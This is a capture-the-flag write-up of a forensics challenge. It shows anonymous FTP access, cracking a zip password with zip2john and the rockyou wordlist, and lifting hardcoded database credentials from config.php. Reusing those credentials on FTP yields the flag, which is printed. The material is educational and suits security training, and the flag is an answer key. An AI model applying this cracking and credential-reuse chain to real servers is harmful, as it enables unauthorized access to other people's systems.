FTP with the command `ftp <domain> <port>`

Find out that you can log in as an anonymous user with the username `anonymous` and a blank password.
```
Connected to <domain>.
220 Welcome
Name (<domain>:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Get the zip file with `get Hotel-Management-System.zip`
```
ftp> dir
229 Entering Extended Passive Mode
150 Here comes the directory listing.
-rw-rw-r--    1 0        0         4131233 Apr 22 16:40 Hotel-Management-System.zip
226 Directory send OK.
ftp> get Hotel-Management-System.zip
local: Hotel-Management-System.zip remote: Hotel-Management-System.zip
229 Entering Extended Passive Mode
150 Opening BINARY mode data connection for Hotel-Management-System.zip (4131233 bytes).
100% |***********************************************************************************************************************************************************************************************|  4034 KiB    3.99 MiB/s    00:00 ETA
226 Transfer complete.
4131233 bytes received in 00:01 (3.75 MiB/s)
ftp> exit
221 Goodbye.
```

Use zip2john and rockyou.txt to crack the zip password
```
└─$ zip2john Hotel-Management-System.zip > hash.txt

└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manager          (Hotel-Management-System.zip)     
1g 0:00:00:00 DONE (2024-05-02 11:06) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
See that the hash is cracked as `manager`

Unzip with the password `manager`
```
└─$ unzip Hotel-Management-System.zip
Archive:  Hotel-Management-System.zip
	creating: Hotel-Management-System/
[Hotel-Management-System.zip] Hotel-Management-System/LICENSE.txt password:
```

Look at the contents of config.php
```
└─$ cd Hotel-Management-System

┌──(kali㉿kali)-[~/CTF/forensics/Hotel-Management-System]
└─$ ls -la                    
total 84
drwxr-xr-x 7 kali kali  4096 Apr 22 19:13 .
drwxr-xr-x 6 kali kali  4096 May  2 11:08 ..
drwxr-xr-x 4 kali kali  4096 Apr 22 19:13 admin
-rw-r--r-- 1 kali kali  6658 Apr 22 19:13 bluebirdhotel.sql
-rw-r--r-- 1 kali kali   338 Apr 22 19:14 config.php
drwxr-xr-x 2 kali kali  4096 Apr 22 19:13 css
-rw-r--r-- 1 kali kali 15053 Apr 22 19:13 home.php
drwxr-xr-x 3 kali kali  4096 Apr 22 19:13 image
-rw-r--r-- 1 kali kali 10701 Apr 22 19:13 index.php
drwxr-xr-x 2 kali kali  4096 Apr 22 19:13 javascript
-rw-r--r-- 1 kali kali  1074 Apr 22 19:13 LICENSE.txt
-rw-r--r-- 1 kali kali    85 Apr 22 19:13 logout.php
-rw-r--r-- 1 kali kali  1343 Apr 22 19:13 README.md
drwxr-xr-x 2 kali kali  4096 Apr 22 19:13 redmiimg
-rwxr-xr-x 1 kali kali   923 Apr 22 19:13 setup.sh

┌──(kali㉿kali)-[~/CTF/forensics/Hotel-Management-System]
└─$ cat config.php            
<?php

$server = "localhost";
$username = "josh";
$password = "KDGbEjRpWl";
$database = "bluebirdhotel";

$conn = mysqli_connect($server,$username,$password,$database);

if(!$conn){
    die("<script>alert('connection Failed.')</script>");
}
// else{
//     echo "<script>alert('connection successfully.')</script>";
// }
?>                                     
```
See that the credentials `josh:KDGbEjRpWl` are leaked

Use these credentials against the FTP server and get flag.txt
```
└─$ ftp <domain> <port>
Connected to <domain>.
220 Welcome
Name (<domain>:user): josh
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (||||)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0              36 Apr 30 13:55 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (||||)
150 Opening BINARY mode data connection for flag.txt (36 bytes).
100% |***********************************************************************************************************************************************************************************************|    36      240.79 KiB/s    00:00 ETA
226 Transfer complete.
36 bytes received in 00:00 (0.58 KiB/s)
ftp> exit
221 Goodbye.

└─$ cat flag.txt  
SUCTF{p455w0rd_r3u53_15_v3ry_c0mm0n}
```

Flag: `SUCTF{p455w0rd_r3u53_15_v3ry_c0mm0n}`